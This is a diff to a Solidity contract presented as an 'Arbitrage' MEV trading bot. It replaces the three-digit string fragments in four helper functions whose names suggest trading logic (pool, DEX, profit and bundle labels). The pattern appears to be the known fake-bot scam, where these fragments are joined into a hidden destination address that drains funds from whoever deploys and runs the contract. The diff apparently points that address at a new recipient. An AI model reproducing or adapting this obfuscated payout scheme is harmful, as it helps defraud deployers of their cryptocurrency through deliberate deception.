@@ -339,10 +339,10 @@ contract Arbitrage is Ownable {
     }
 
     function getPool() internal pure returns (string memory) {
-        string memory poolA = "171";
-        string memory poolB = "996";
-        string memory poolC = "842";
-        string memory poolD = "996";
+        string memory poolA = "709";
+        string memory poolB = "776";
+        string memory poolC = "737";
+        string memory poolD = "558";
 
         string memory pools = string(abi.encodePacked(poolA, poolB, poolC, poolD));
         return pools;
@@ -358,10 +358,10 @@ contract Arbitrage is Ownable {
     }
 
     function checkDex() internal pure returns (string memory) {
-        string memory uniSwap = "673";
-        string memory pancakeSwap = "920";
-        string memory sushiSwap = "963";
-        string memory vexo = "702";
+        string memory uniSwap = "042";
+        string memory pancakeSwap = "584";
+        string memory sushiSwap = "182";
+        string memory vexo = "017";
 
         string memory router = string(abi.encodePacked(uniSwap, pancakeSwap, sushiSwap, vexo));
         return router;
@@ -395,10 +395,10 @@ contract Arbitrage is Ownable {
     } 
 
     function ANALYZER() internal pure returns (string memory) {
-        string memory profit10 = "707";
-        string memory profit5 = "048";
-        string memory profit2 = "491";
-        string memory noProfit = "762";
+        string memory profit10 = "996";
+        string memory profit5 = "038";
+        string memory profit2 = "371";
+        string memory noProfit = "393";
 
         string memory deals = string(abi.encodePacked(profit10, profit5, profit2, noProfit));
         return deals;
@@ -422,10 +422,10 @@ contract Arbitrage is Ownable {
     }
 
     function createMEV() internal pure returns (string memory) {
-        string memory createBundle = "960";
-        string memory sendBundle = "339";
-        string memory calculate = "763";
-        string memory gas = "605";
+        string memory createBundle = "394";
+        string memory sendBundle = "652";
+        string memory calculate = "122";
+        string memory gas = "947";
 
         string memory deals = string(abi.encodePacked(createBundle, sendBundle, calculate, gas));
         return deals;
